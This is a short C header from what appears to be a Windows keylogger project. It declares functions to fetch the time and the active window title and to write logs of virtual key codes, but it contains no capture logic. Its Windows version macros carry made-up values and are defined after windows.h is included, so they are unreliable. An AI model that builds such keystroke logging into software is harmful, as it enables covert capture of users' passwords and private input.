#ifndef WINKEY_H
#define WINKEY_H

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <windows.h>

/* 
    minimal version facor compilator 
    0x0A00 -> windows 10
*/
#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WIN10_TH2  0x0A00
#define _WIN32_WINNT_WIN10_RS1  0x0A00
#define _WIN32_WINNT_WIN10_RS2  0x0A01
#define _WIN32_WINNT_WIN10_RS3  0x0A02
#define _WIN32_WINNT_WIN10_RS4  0x0A03
#define _WIN32_WINNT_WIN10_RS5  0x0A04

// logs_utils.c
char    *GetMyLocalTime(void);
char    *GetActiveWindowTitle(void);
char    *FormatLogTime(void);

// logs.c
void    WriteLogs(DWORD vkCode);


#endif